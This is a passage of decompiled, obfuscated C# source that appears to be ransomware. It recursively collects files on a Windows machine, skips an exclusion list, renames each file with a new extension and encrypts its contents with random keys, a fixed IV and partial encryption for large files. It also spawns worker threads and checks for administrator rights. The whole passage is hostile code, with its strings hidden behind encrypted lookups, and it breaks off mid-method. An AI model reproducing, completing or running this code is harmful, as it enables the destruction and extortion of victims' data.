using System;
using System.Collections.Generic;
using System.Collections.Specialized;
using System.Diagnostics;
using System.IO;
using System.IO.MemoryMappedFiles;
using System.Linq;
using System.Management;
using System.Net;
using System.Reflection;
using System.Runtime.InteropServices;
using System.Security;
using System.Security.AccessControl;
using System.Security.Cryptography;
using System.Security.Principal;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;
using LKDFotCmhcU;
using Microsoft.Win32;
using SmartAssembly.Delegates;
using SmartAssembly.HouseOfCards;
using oFbodOYJTt;

namespace frgoWklvEOSV;

internal sealed class PFruJiQrcriiZ
{
	public sealed class RAjgPCVHZF
	{
		private static StringCollection rKTaPFzOWa;

		private static List<string> KgTnddVGDKK;

		[NonSerialized]
		internal static GetString _0006;

		public static List<string> SearchFiles(string P_0)
		{
			List<string> list = new List<string>();
			return WalkDirectoryTree(P_0);
		}

		private static List<string> WalkDirectoryTree(string P_0)
		{
			string[] array = null;
			string[] array2 = null;
			try
			{
				array = Directory.GetFiles(P_0, _0006(107403605));
			}
			catch
			{
			}
			if (array != null)
			{
				string[] array3 = array;
				foreach (string text in array3)
				{
					try
					{
						if (!text.ToLower().Contains(_0006(107403600)) && !text.ToLower().Contains(_0006(107403579)) && !text.ToLower().Contains(_0006(107388874)) && !text.ToLower().Contains(_0006(107388829)) && !text.ToLower().Contains(_0006(107403598)) && !text.ToLower().Contains(_0006(107388201)) && !text.ToLower().Contains(_0006(107388142)) && !text.ToLower().Contains(_0006(107388093)) && !text.ToLower().Contains(_0006(107388108)) && !text.ToLower().Contains(_0006(107388059)) && !text.ToLower().Contains(_0006(107388025)) && !text.ToLower().Contains(_0006(107388040)) && !text.ToLower().Contains(_0006(107388503)) && !text.ToLower().Contains(_0006(107388522)) && !text.ToLower().Contains(_0006(107388469)) && !text.ToLower().Contains(_0006(107388488)) && !text.ToLower().Contains(_0006(107388443)) && !text.ToLower().Contains(_0006(107388458)) && !text.ToLower().Contains(_0006(107388409)) && !text.Contains(GwTsezEgVAuVAU(_0006(107388424))) && !text.Contains(_0006(107388399)) && !text.Contains(_0006(107388386)) && !text.EndsWith(_0006(107395438)) && !text.EndsWith(_0006(107388361)) && !text.EndsWith(_0006(107388356)) && !text.EndsWith(_0006(107388319)) && !text.EndsWith(_0006(107388314)) && !text.ToLower().Contains(_0006(107388309)) && !text.ToLower().Contains(LIbWxYpDOmPy))
						{
							if (File.Exists(text) && (double)text.Length <= double.Parse(cJvZgRMCiiT) * 1024.0 * 1024.0 && kvJFoDYMuC == _0006(107396858))
							{
								KgTnddVGDKK.Add(text);
							}
							else if (File.Exists(text) && kvJFoDYMuC == _0006(107397018))
							{
								KgTnddVGDKK.Add(text);
							}
						}
					}
					catch
					{
					}
				}
				array2 = Directory.GetDirectories(P_0);
				string[] array4 = array2;
				foreach (string text2 in array4)
				{
					WalkDirectoryTree(text2);
				}
			}
			return KgTnddVGDKK;
		}

		static RAjgPCVHZF()
		{
			Strings.CreateGetStringDelegate(typeof(RAjgPCVHZF));
			rKTaPFzOWa = new StringCollection();
			KgTnddVGDKK = new List<string>();
		}
	}

	private sealed class dkdfdmXmxAk
	{
		public string sZxLlvESUzLZXKq;

		public bool _003CMain_003Eb__6(Process P_0)
		{
			return P_0.ProcessName == sZxLlvESUzLZXKq;
		}
	}

	private sealed class OjfhzFWYFdyA
	{
		public string[] JNtjaLfncUVSAvQ;

		public void _003CMain_003Eb__7()
		{
			PmZcbpYMQkkuHdO.xRTdqUJOGhXP(JNtjaLfncUVSAvQ);
		}
	}

	private sealed class qZMjyZfSuemhC
	{
		private sealed class DCzjcOwiJDl
		{
			public qZMjyZfSuemhC APrnMdZiEm;

			public string NyPtOimZdkEdllM;

			public void _003CCrypt_003Eb__23()
			{
				if (new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator))
				{
					BDTFnPeiNCX(WindowsIdentity.GetCurrent().Name, NyPtOimZdkEdllM);
				}
			}

			public void _003CCrypt_003Eb__24()
			{
				HGTRyKvTZjusOL(NyPtOimZdkEdllM, APrnMdZiEm.gEhXXIzChk, APrnMdZiEm.sZqoWBfJdvFIl, APrnMdZiEm.WLgJdVMBruB, APrnMdZiEm.wxfrhJHvjWjHlu);
			}
		}

		public string[] gEhXXIzChk;

		public string[] WLgJdVMBruB;

		public string wxfrhJHvjWjHlu;

		public string sZqoWBfJdvFIl;

		[NonSerialized]
		internal static GetString _008B;

		public void _003CCrypt_003Eb__22(string P_0)
		{
			DCzjcOwiJDl CS_0024_003C_003E8__locals0 = new DCzjcOwiJDl();
			CS_0024_003C_003E8__locals0.APrnMdZiEm = this;
			CS_0024_003C_003E8__locals0.NyPtOimZdkEdllM = P_0;
			if (upflSQRmeWP && !PAhtGWwudbxozQK().Contains(_008B(107386888)))
			{
				Thread thread = new Thread((ThreadStart)delegate
				{
					if (new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator))
					{
						BDTFnPeiNCX(WindowsIdentity.GetCurrent().Name, CS_0024_003C_003E8__locals0.NyPtOimZdkEdllM);
					}
				});
				thread.Priority = ThreadPriority.Normal;
				thread.IsBackground = true;
				thread.Start();
			}
			if (iEHeKlEPYHGI == _008B(107396865))
			{
				Thread thread2 = new Thread((ThreadStart)delegate
				{
					HGTRyKvTZjusOL(CS_0024_003C_003E8__locals0.NyPtOimZdkEdllM, CS_0024_003C_003E8__locals0.APrnMdZiEm.gEhXXIzChk, CS_0024_003C_003E8__locals0.APrnMdZiEm.sZqoWBfJdvFIl, CS_0024_003C_003E8__locals0.APrnMdZiEm.WLgJdVMBruB, CS_0024_003C_003E8__locals0.APrnMdZiEm.wxfrhJHvjWjHlu);
				});
				thread2.Priority = ThreadPriority.Normal;
				thread2.IsBackground = false;
				thread2.Start();
				thread2.Join();
			}
			else
			{
				HGTRyKvTZjusOL(CS_0024_003C_003E8__locals0.NyPtOimZdkEdllM, gEhXXIzChk, sZqoWBfJdvFIl, WLgJdVMBruB, wxfrhJHvjWjHlu);
			}
		}

		static qZMjyZfSuemhC()
		{
			Strings.CreateGetStringDelegate(typeof(qZMjyZfSuemhC));
		}
	}

	private sealed class kFfBlUyayStE
	{
		private sealed class knpMjkNPiIY
		{
			public kFfBlUyayStE JhmFrwpsOrTq;

			public string JqgYVVMwzVoNzX;

			[NonSerialized]
			internal static GetString _001D;

			public void _003CWorkerCrypter2_003Eb__30()
			{
				foreach (string item in EKjYgfCTgvyfhvOPx)
				{
					if (JqgYVVMwzVoNzX.ToLower().EndsWith(item + JhmFrwpsOrTq.ZDxRrpKTbd) && vEWBFQaTPDgk == _001D(107396876))
					{
						if (Convert.ToInt32(PyFcFDpqJkSW) * 1024 * 1024 > new FileInfo(JqgYVVMwzVoNzX).Length)
						{
							try
							{
								GyWbmViNanxKl.DGdOiIgzOMW(_001D(107389341), _001D(107389336), _001D(107388779), JqgYVVMwzVoNzX);
							}
							catch
							{
							}
						}
					}
					else if (JqgYVVMwzVoNzX.ToLower().EndsWith(item) && vEWBFQaTPDgk == _001D(107397036))
					{
						try
						{
							GyWbmViNanxKl.DGdOiIgzOMW(_001D(107389341), _001D(107389336), _001D(107388779), JqgYVVMwzVoNzX);
						}
						catch
						{
						}
					}
				}
			}

			static knpMjkNPiIY()
			{
				Strings.CreateGetStringDelegate(typeof(knpMjkNPiIY));
			}
		}

		private sealed class YUIjdATTEVIX
		{
			public kFfBlUyayStE JhmFrwpsOrTq;

			public string PUDDzPYRoE;

			[NonSerialized]
			internal static GetString _0008;

			public void _003CWorkerCrypter2_003Eb__32()
			{
				foreach (string item in EKjYgfCTgvyfhvOPx)
				{
					if (PUDDzPYRoE.ToLower().EndsWith(item + JhmFrwpsOrTq.ZDxRrpKTbd) && vEWBFQaTPDgk == _0008(107396879))
					{
						if (Convert.ToInt32(PyFcFDpqJkSW) * 1024 * 1024 > new FileInfo(PUDDzPYRoE).Length)
						{
							try
							{
								GyWbmViNanxKl.DGdOiIgzOMW(_0008(107389344), _0008(107389339), _0008(107388782), PUDDzPYRoE);
							}
							catch
							{
							}
						}
					}
					else if (PUDDzPYRoE.ToLower().EndsWith(item) && vEWBFQaTPDgk == _0008(107397039))
					{
						try
						{
							GyWbmViNanxKl.DGdOiIgzOMW(_0008(107389344), _0008(107389339), _0008(107388782), PUDDzPYRoE);
						}
						catch
						{
						}
					}
				}
			}

			static YUIjdATTEVIX()
			{
				Strings.CreateGetStringDelegate(typeof(YUIjdATTEVIX));
			}
		}

		public List<string> ZfHQdOmNHVP;

		public List<string> WNvdcTPDgW;

		public string ZDxRrpKTbd;

		public string[] dXgeOiXUaNyFEW;

		public string nyAmnOdcSzzfJ;

		[NonSerialized]
		internal static GetString _0082;

		public void _003CWorkerCrypter2_003Eb__2f(string P_0)
		{
			knpMjkNPiIY CS_0024_003C_003E8__locals0;
			foreach (string item in WNvdcTPDgW)
			{
				if (dXgeOiXUaNyFEW.Length != 0)
				{
					string[] array = dXgeOiXUaNyFEW;
					foreach (string value in array)
					{
						if (item.EndsWith(value))
						{
							goto IL_09d7;
						}
					}
				}
				try
				{
					if (item.EndsWith(ZDxRrpKTbd))
					{
						goto IL_09d7;
					}
				}
				catch (Exception)
				{
					goto IL_09d7;
				}
				if (!item.EndsWith(P_0) || yGkMwQPqUdXIj.Contains(item))
				{
					continue;
				}
				if (cySCSfjuDKIn == _0082(107396873))
				{
					try
					{
						if (NqaDDCCMEbCxV.SmlSZjnRIeVP(item))
						{
							NqaDDCCMEbCxV.XkoarExxofRiBeK(item);
						}
					}
					catch
					{
					}
				}
				yGkMwQPqUdXIj.Add(item);
				if (!SlSeSNfJnzNh.Contains(Path.GetDirectoryName(item)))
				{
					SlSeSNfJnzNh.Add(Path.GetDirectoryName(item));
				}
				VmNlRJHbsFKpwZ(item);
				try
				{
					new vyQYEsUfMyGoFM().rjhwntJsrm(item);
				}
				catch
				{
				}
				try
				{
					using FileStream fileStream = new FileStream(item, FileMode.Open, FileAccess.Write);
					if (!fileStream.CanWrite)
					{
						try
						{
							if (qoRjYABduZF)
							{
								Console.WriteLine(_0082(107403564) + item + _0082(107403519) + new FileInfo(item).Length + _0082(107403498));
								Console.WriteLine(_0082(107403489));
							}
						}
						catch
						{
						}
						KXNiSRaxzeIpPt(GwTsezEgVAuVAU(_0082(107403416)), _0082(107387760) + item + _0082(107387760) + GwTsezEgVAuVAU(_0082(107403871)) + _0082(107387760) + Environment.UserName + _0082(107387760) + GwTsezEgVAuVAU(_0082(107403854)));
					}
				}
				catch (Exception ex2)
				{
					if (joesCNAxeHUI)
					{
						try
						{
							File.AppendAllText(jnRLNtXuRRg, _0082(107386518) + item + _0082(107403861) + ex2.Message + _0082(107396306));
						}
						catch (Exception)
						{
						}
					}
					continue;
				}
				try
				{
					try
					{
						if (new FileInfo(item).Length == 0)
						{
							continue;
						}
					}
					catch (Exception ex4)
					{
						if (joesCNAxeHUI)
						{
							try
							{
								File.AppendAllText(jnRLNtXuRRg, _0082(107386518) + item + _0082(107403748) + ex4.Message + _0082(107396306));
							}
							catch (Exception)
							{
							}
						}
						iePhSHBTqLd++;
						goto end_IL_02ca;
					}
					if (CdQMIPJOkrOUDSy == _0082(107396873) && new FileInfo(item).Length > Convert.ToInt32(xYkYbBCyjIxz) * 1024 * 1024 && !ZfHQdOmNHVP.Contains(P_0))
					{
						CS_0024_003C_003E8__locals0 = new knpMjkNPiIY();
						CS_0024_003C_003E8__locals0.JhmFrwpsOrTq = this;
						try
						{
							if (ZDxRrpKTbd != _0082(107386778))
							{
								if (MiZHZrKmtKkaPXn)
								{
									ZDxRrpKTbd = RBZnAGRnuwHeRmi + ZDxRrpKTbd;
								}
								File.Move(item, item + ZDxRrpKTbd);
							}
						}
						catch (Exception ex6)
						{
							if (joesCNAxeHUI)
							{
								try
								{
									File.AppendAllText(jnRLNtXuRRg, _0082(107386518) + item + _0082(107403687) + ex6.Message + _0082(107396306));
								}
								catch (Exception)
								{
								}
							}
							iePhSHBTqLd++;
							goto end_IL_02ca;
						}
						CS_0024_003C_003E8__locals0.JqgYVVMwzVoNzX = _0082(107388713);
						if (ZDxRrpKTbd != _0082(107386778))
						{
							CS_0024_003C_003E8__locals0.JqgYVVMwzVoNzX = item + ZDxRrpKTbd;
						}
						else
						{
							CS_0024_003C_003E8__locals0.JqgYVVMwzVoNzX = item;
						}
						if (bxhZXFvKXZl == _0082(107396873))
						{
							Thread thread = new Thread((ThreadStart)delegate
							{
								foreach (string item2 in EKjYgfCTgvyfhvOPx)
								{
									if (CS_0024_003C_003E8__locals0.JqgYVVMwzVoNzX.ToLower().EndsWith(item2 + CS_0024_003C_003E8__locals0.JhmFrwpsOrTq.ZDxRrpKTbd) && vEWBFQaTPDgk == knpMjkNPiIY._001D(107396876))
									{
										if (Convert.ToInt32(PyFcFDpqJkSW) * 1024 * 1024 > new FileInfo(CS_0024_003C_003E8__locals0.JqgYVVMwzVoNzX).Length)
										{
											try
											{
												GyWbmViNanxKl.DGdOiIgzOMW(knpMjkNPiIY._001D(107389341), knpMjkNPiIY._001D(107389336), knpMjkNPiIY._001D(107388779), CS_0024_003C_003E8__locals0.JqgYVVMwzVoNzX);
											}
											catch
											{
											}
										}
									}
									else if (CS_0024_003C_003E8__locals0.JqgYVVMwzVoNzX.ToLower().EndsWith(item2) && vEWBFQaTPDgk == knpMjkNPiIY._001D(107397036))
									{
										try
										{
											GyWbmViNanxKl.DGdOiIgzOMW(knpMjkNPiIY._001D(107389341), knpMjkNPiIY._001D(107389336), knpMjkNPiIY._001D(107388779), CS_0024_003C_003E8__locals0.JqgYVVMwzVoNzX);
										}
										catch
										{
										}
									}
								}
							});
							thread.Priority = ThreadPriority.Normal;
							thread.IsBackground = false;
							thread.Start();
						}
						string text = AnLYutpDjmCX.cVQEpGjgoi(32);
						string s = FlpXYRWvTX.ZTvekdOmyg(text);
						byte[] bytes = Encoding.ASCII.GetBytes(s);
						if (QGAYpwMzxm == _0082(107397033))
						{
							byte[] array2 = null;
							byte[] array3 = fkozHCDTDrY.OlBXyEPnCYpDO(CS_0024_003C_003E8__locals0.JqgYVVMwzVoNzX, Convert.ToInt32(xYkYbBCyjIxz) * 1024 * 1024);
							if (fkozHCDTDrY.wXhdORmUgbGuB(quwoLGzcjeGYg: (!VGKELVlTFUV) ? (IooTTsvIiwCN ? fkozHCDTDrY.GVHcoGquozRzL(array3, Encoding.ASCII.GetBytes(text), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 }) : fkozHCDTDrY.GVHcoGquozRzL(array3, Encoding.ASCII.GetBytes(nyAmnOdcSzzfJ), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 })) : (IooTTsvIiwCN ? RpWKlAyYXuFg.pUQagweWpoRi(array3, Encoding.ASCII.GetBytes(text), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 }) : RpWKlAyYXuFg.pUQagweWpoRi(array3, Encoding.ASCII.GetBytes(nyAmnOdcSzzfJ), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 })), ZsIFKCtaED: CS_0024_003C_003E8__locals0.JqgYVVMwzVoNzX, TTsauZziAEbN: bytes))
							{
								goto IL_09d7;
							}
							try
							{
								File.Move(item + ZDxRrpKTbd, item);
							}
							catch (Exception)
							{
							}
						}
						else if (!IooTTsvIiwCN)
						{
							if (dsNajfALrLtCLf.PPfLKlDWqkz(CS_0024_003C_003E8__locals0.JqgYVVMwzVoNzX, xYkYbBCyjIxz, nyAmnOdcSzzfJ))
							{
								goto IL_09d7;
							}
							try
							{
								File.Move(item + ZDxRrpKTbd, item);
							}
							catch (Exception)
							{
							}
						}
						else
						{
							if (dsNajfALrLtCLf.PPfLKlDWqkz(CS_0024_003C_003E8__locals0.JqgYVVMwzVoNzX, xYkYbBCyjIxz, text, bytes))
							{
								goto IL_09d7;
							}
							try
							{
								File.Move(item + ZDxRrpKTbd, item);
							}
							catch (Exception)
							{
							}
						}
						continue;
					}
					if (MiZHZrKmtKkaPXn)
					{
						ZDxRrpKTbd = RBZnAGRnuwHeRmi + ZDxRrpKTbd;
					}
					string text2 = AnLYutpDjmCX.cVQEpGjgoi(32);
					string s2 = FlpXYRWvTX.ZTvekdOmyg(text2);
					byte[] bytes2 = Encoding.ASCII.GetBytes(s2);
					if (ZDxRrpKTbd != _0082(107386778))
					{
						if (!EcdpqbMrQOzfdgL)
						{
							if (!IooTTsvIiwCN)
							{
								GKkFnjoUAoXGqN(item, item + ZDxRrpKTbd, lrVhqMPbYlaOK);
							}
							else
							{
								GKkFnjoUAoXGqN(item, item + ZDxRrpKTbd, Encoding.ASCII.GetBytes(text2));
							}
						}
						else
						{
							try
							{
								if (!IooTTsvIiwCN)
								{
									IzvDPVDWsNMZj(item, item + ZDxRrpKTbd, lrVhqMPbYlaOK);
								}
								else
								{
									IzvDPVDWsNMZj(item, item + ZDxRrpKTbd, Encoding.ASCII.GetBytes(text2));
								}
							}
							catch (Exception ex11)
							{
								if (joesCNAxeHUI)
								{
									try
									{
										File.AppendAllText(jnRLNtXuRRg, _0082(107386518) + item + _0082(107386220) + ex11.Message + _0082(107396306));
									}
									catch (Exception)
									{
									}
								}
								iePhSHBTqLd++;
								try
								{
									File.Move(item + ZDxRrpKTbd, item);
								}
								catch (Exception)
								{
								}
								goto end_IL_02ca;
							}
						}
					}
					else if (!EcdpqbMrQOzfdgL)
					{
						if (!IooTTsvIiwCN)
						{
							GKkFnjoUAoXGqN(item, item + _0082(107386773), lrVhqMPbYlaOK);
						}
						else
						{
							GKkFnjoUAoXGqN(item, item + _0082(107386773), Encoding.ASCII.GetBytes(text2));
						}
					}
					else
					{
						try
						{
							if (!IooTTsvIiwCN)
							{
								IzvDPVDWsNMZj(item, item, lrVhqMPbYlaOK);
							}
							else
							{
								IzvDPVDWsNMZj(item, item, Encoding.ASCII.GetBytes(text2));
							}
						}
						catch (Exception ex14)
						{
							if (joesCNAxeHUI)
							{
								try
								{
									File.AppendAllText(jnRLNtXuRRg, _0082(107386518) + item + _0082(107386220) + ex14.Message + _0082(107396306));
								}
								catch (Exception)
								{
								}
							}
							iePhSHBTqLd++;
							goto end_IL_02ca;
						}
					}
					if (IooTTsvIiwCN)
					{
						if (ZDxRrpKTbd != _0082(107386778))
						{
							KGSDHYAAGYu(item + ZDxRrpKTbd, bytes2);
						}
						else
						{
							KGSDHYAAGYu(item, bytes2);
						}
					}
					goto IL_09d7;
					end_IL_02ca:;
				}
				catch (Exception)
				{
					goto IL_09d7;
				}
				continue;
				IL_09d7:
				WNvdcTPDgW.Remove(item);
			}
		}

		public void _003CWorkerCrypter2_003Eb__31(string P_0)
		{
			YUIjdATTEVIX CS_0024_003C_003E8__locals0 = new YUIjdATTEVIX();
			CS_0024_003C_003E8__locals0.JhmFrwpsOrTq = this;
			CS_0024_003C_003E8__locals0.PUDDzPYRoE = P_0;
			if (dXgeOiXUaNyFEW.Length != 0)
			{
				string[] array = dXgeOiXUaNyFEW;
				foreach (string value in array)
				{
					if (CS_0024_003C_003E8__locals0.PUDDzPYRoE.EndsWith(value))
					{
						goto IL_0ab8;
					}
				}
			}
			try
			{
				if (CS_0024_003C_003E8__locals0.PUDDzPYRoE.EndsWith(ZDxRrpKTbd))
				{
					goto IL_0ab8;
				}
			}
			catch (Exception)
			{
				goto IL_0ab8;
			}
			if (!yGkMwQPqUdXIj.Contains(CS_0024_003C_003E8__locals0.PUDDzPYRoE))
			{
				if (cySCSfjuDKIn == _0082(107396873))
				{
					try
					{
						if (NqaDDCCMEbCxV.SmlSZjnRIeVP(CS_0024_003C_003E8__locals0.PUDDzPYRoE))
						{
							NqaDDCCMEbCxV.XkoarExxofRiBeK(CS_0024_003C_003E8__locals0.PUDDzPYRoE);
						}
					}
					catch
					{
					}
				}
				yGkMwQPqUdXIj.Add(CS_0024_003C_003E8__locals0.PUDDzPYRoE);
				if (!SlSeSNfJnzNh.Contains(Path.GetDirectoryName(CS_0024_003C_003E8__locals0.PUDDzPYRoE)))
				{
					SlSeSNfJnzNh.Add(Path.GetDirectoryName(CS_0024_003C_003E8__locals0.PUDDzPYRoE));
				}
				VmNlRJHbsFKpwZ(CS_0024_003C_003E8__locals0.PUDDzPYRoE);
				try
				{
					new vyQYEsUfMyGoFM().rjhwntJsrm(CS_0024_003C_003E8__locals0.PUDDzPYRoE);
				}
				catch
				{
				}
				try
				{
					using FileStream fileStream = new FileStream(CS_0024_003C_003E8__locals0.PUDDzPYRoE, FileMode.Open, FileAccess.Write);
					if (!fileStream.CanWrite)
					{
						try
						{
							if (qoRjYABduZF)
							{
								Console.WriteLine(_0082(107403564) + CS_0024_003C_003E8__locals0.PUDDzPYRoE + _0082(107403519) + new FileInfo(CS_0024_003C_003E8__locals0.PUDDzPYRoE).Length + _0082(107403498));
								Console.WriteLine(_0082(107403489));
							}
						}
						catch
						{
						}
						KXNiSRaxzeIpPt(GwTsezEgVAuVAU(_0082(107403416)), _0082(107387760) + CS_0024_003C_003E8__locals0.PUDDzPYRoE + _0082(107387760) + GwTsezEgVAuVAU(_0082(107403871)) + _0082(107387760) + Environment.UserName + _0082(107387760) + GwTsezEgVAuVAU(_0082(107403854)));
					}
				}
				catch (Exception ex2)
				{
					if (joesCNAxeHUI)
					{
						try
						{
							File.AppendAllText(jnRLNtXuRRg, _0082(107386518) + CS_0024_003C_003E8__locals0.PUDDzPYRoE + _0082(107403861) + ex2.Message + _0082(107396306));
							return;
						}
						catch (Exception)
						{
							return;
						}
					}
					return;
				}
				try
				{
					try
					{
						if (new FileInfo(CS_0024_003C_003E8__locals0.PUDDzPYRoE).Length != 0)
						{
							goto end_IL_031b;
						}
						goto end_IL_031b_2;
						end_IL_031b:;
					}
					catch (Exception ex4)
					{
						if (joesCNAxeHUI)
						{
							try
							{
								File.AppendAllText(jnRLNtXuRRg, _0082(107386518) + CS_0024_003C_003E8__locals0.PUDDzPYRoE + _0082(107403748) + ex4.Message + _0082(107396306));
							}
							catch (Exception)
							{
							}
						}
						iePhSHBTqLd++;
						goto end_IL_031b_2;
					}
					if (CdQMIPJOkrOUDSy == _0082(107396873) && new FileInfo(CS_0024_003C_003E8__locals0.PUDDzPYRoE).Length > Convert.ToInt32(xYkYbBCyjIxz) * 1024 * 1024)
					{
						try
						{
							if (ZDxRrpKTbd != _0082(107386778))
							{
								if (MiZHZrKmtKkaPXn)
								{
									ZDxRrpKTbd = RBZnAGRnuwHeRmi + ZDxRrpKTbd;
								}
								File.Move(CS_0024_003C_003E8__locals0.PUDDzPYRoE, CS_0024_003C_003E8__locals0.PUDDzPYRoE + ZDxRrpKTbd);
							}
						}
						catch (Exception ex6)
						{
							if (joesCNAxeHUI)
							{
								try
								{
									File.AppendAllText(jnRLNtXuRRg, _0082(107386518) + CS_0024_003C_003E8__locals0.PUDDzPYRoE + _0082(107403687) + ex6.Message + _0082(107396306));
								}
								catch (Exception)
								{
								}
							}
							iePhSHBTqLd++;
							return;
						}
						if (ZDxRrpKTbd != _0082(107386778))
						{
							CS_0024_003C_003E8__locals0.PUDDzPYRoE += ZDxRrpKTbd;
						}
						if (bxhZXFvKXZl == _0082(107396873))
						{
							Thread thread = new Thread((ThreadStart)delegate
							{
								foreach (string item in EKjYgfCTgvyfhvOPx)
								{
									if (CS_0024_003C_003E8__locals0.PUDDzPYRoE.ToLower().EndsWith(item + CS_0024_003C_003E8__locals0.JhmFrwpsOrTq.ZDxRrpKTbd) && vEWBFQaTPDgk == YUIjdATTEVIX._0008(107396879))
									{
										if (Convert.ToInt32(PyFcFDpqJkSW) * 1024 * 1024 > new FileInfo(CS_0024_003C_003E8__locals0.PUDDzPYRoE).Length)
										{
											try
											{
												GyWbmViNanxKl.DGdOiIgzOMW(YUIjdATTEVIX._0008(107389344), YUIjdATTEVIX._0008(107389339), YUIjdATTEVIX._0008(107388782), CS_0024_003C_003E8__locals0.PUDDzPYRoE);
											}
											catch
											{
											}
										}
									}
									else if (CS_0024_003C_003E8__locals0.PUDDzPYRoE.ToLower().EndsWith(item) && vEWBFQaTPDgk == YUIjdATTEVIX._0008(107397039))
									{
										try
										{
											GyWbmViNanxKl.DGdOiIgzOMW(YUIjdATTEVIX._0008(107389344), YUIjdATTEVIX._0008(107389339), YUIjdATTEVIX._0008(107388782), CS_0024_003C_003E8__locals0.PUDDzPYRoE);
										}
										catch
										{
										}
									}
								}
							});
							thread.IsBackground = false;
							thread.Priority = ThreadPriority.Normal;
							thread.Start();
						}
						string text = AnLYutpDjmCX.cVQEpGjgoi(32);
						string s = FlpXYRWvTX.ZTvekdOmyg(text);
						byte[] bytes = Encoding.ASCII.GetBytes(s);
						if (QGAYpwMzxm == _0082(107397033))
						{
							byte[] array2 = null;
							byte[] array3 = fkozHCDTDrY.OlBXyEPnCYpDO(CS_0024_003C_003E8__locals0.PUDDzPYRoE, Convert.ToInt32(xYkYbBCyjIxz) * 1024 * 1024);
							if (!fkozHCDTDrY.wXhdORmUgbGuB(quwoLGzcjeGYg: (!VGKELVlTFUV) ? (IooTTsvIiwCN ? fkozHCDTDrY.GVHcoGquozRzL(array3, Encoding.ASCII.GetBytes(text), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 }) : fkozHCDTDrY.GVHcoGquozRzL(array3, Encoding.ASCII.GetBytes(nyAmnOdcSzzfJ), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 })) : (IooTTsvIiwCN ? RpWKlAyYXuFg.pUQagweWpoRi(array3, Encoding.ASCII.GetBytes(text), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 }) : RpWKlAyYXuFg.pUQagweWpoRi(array3, Encoding.ASCII.GetBytes(nyAmnOdcSzzfJ), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 })), ZsIFKCtaED: CS_0024_003C_003E8__locals0.PUDDzPYRoE, TTsauZziAEbN: bytes))
							{
								try
								{
									File.Move(CS_0024_003C_003E8__locals0.PUDDzPYRoE + ZDxRrpKTbd, CS_0024_003C_003E8__locals0.PUDDzPYRoE);
									return;
								}
								catch (Exception)
								{
									return;
								}
							}
						}
						else if (!IooTTsvIiwCN)
						{
							if (!dsNajfALrLtCLf.PPfLKlDWqkz(CS_0024_003C_003E8__locals0.PUDDzPYRoE, xYkYbBCyjIxz, nyAmnOdcSzzfJ))
							{
								try
								{
									File.Move(CS_0024_003C_003E8__locals0.PUDDzPYRoE + ZDxRrpKTbd, CS_0024_003C_003E8__locals0.PUDDzPYRoE);
									return;
								}
								catch (Exception)
								{
									return;
								}
							}
						}
						else if (!dsNajfALrLtCLf.PPfLKlDWqkz(CS_0024_003C_003E8__locals0.PUDDzPYRoE, xYkYbBCyjIxz, text, bytes))
						{
							try
							{
								File.Move(CS_0024_003C_003E8__locals0.PUDDzPYRoE + ZDxRrpKTbd, CS_0024_003C_003E8__locals0.PUDDzPYRoE);
								return;
							}
							catch (Exception)
							{
								return;
							}
						}
					}
					else
					{
						if (MiZHZrKmtKkaPXn)
						{
							ZDxRrpKTbd = RBZnAGRnuwHeRmi + ZDxRrpKTbd;
						}
						string text2 = AnLYutpDjmCX.cVQEpGjgoi(32);
						string s2 = FlpXYRWvTX.ZTvekdOmyg(text2);
						byte[] bytes2 = Encoding.ASCII.GetBytes(s2);
						if (ZDxRrpKTbd != _0082(107386778))
						{
							if (!EcdpqbMrQOzfdgL)
							{
								if (!IooTTsvIiwCN)
								{
									GKkFnjoUAoXGqN(CS_0024_003C_003E8__locals0.PUDDzPYRoE, CS_0024_003C_003E8__locals0.PUDDzPYRoE + ZDxRrpKTbd, lrVhqMPbYlaOK);
								}
								else
								{
									GKkFnjoUAoXGqN(CS_0024_003C_003E8__locals0.PUDDzPYRoE, CS_0024_003C_003E8__locals0.PUDDzPYRoE + ZDxRrpKTbd, Encoding.ASCII.GetBytes(text2));
								}
							}
							else
							{
								try
								{
									if (!IooTTsvIiwCN)
									{
										IzvDPVDWsNMZj(CS_0024_003C_003E8__locals0.PUDDzPYRoE, CS_0024_003C_003E8__locals0.PUDDzPYRoE + ZDxRrpKTbd, lrVhqMPbYlaOK);
									}
									else
									{
										IzvDPVDWsNMZj(CS_0024_003C_003E8__locals0.PUDDzPYRoE, CS_0024_003C_003E8__locals0.PUDDzPYRoE + ZDxRrpKTbd, Encoding.ASCII.GetBytes(text2));
									}
								}
								catch (Exception ex11)
								{
									if (joesCNAxeHUI)
									{
										try
										{
											File.AppendAllText(jnRLNtXuRRg, _0082(107386518) + CS_0024_003C_003E8__locals0.PUDDzPYRoE + _0082(107386220) + ex11.Message + _0082(107396306));
										}
										catch (Exception)
										{
										}
									}
									iePhSHBTqLd++;
									try
									{
										File.Move(CS_0024_003C_003E8__locals0.PUDDzPYRoE + ZDxRrpKTbd, CS_0024_003C_003E8__locals0.PUDDzPYRoE);
										return;
									}
									catch (Exception)
									{
										return;
									}
								}
							}
						}
						else if (!EcdpqbMrQOzfdgL)
						{
							if (!IooTTsvIiwCN)
							{
								GKkFnjoUAoXGqN(CS_0024_003C_003E8__locals0.PUDDzPYRoE, CS_0024_003C_003E8__locals0.PUDDzPYRoE + _0082(107386773), lrVhqMPbYlaOK);
							}
							else
							{
								GKkFnjoUAoXGqN(CS_0024_003C_003E8__locals0.PUDDzPYRoE, CS_0024_003C_003E8__locals0.PUDDzPYRoE + _0082(107386773), Encoding.ASCII.GetBytes(text2));
							}
						}
						else
						{
							try
							{
								if (!IooTTsvIiwCN)
								{
									IzvDPVDWsNMZj(CS_0024_003C_003E8__locals0.PUDDzPYRoE, CS_0024_003C_003E8__locals0.PUDDzPYRoE, lrVhqMPbYlaOK);
								}
								else
								{
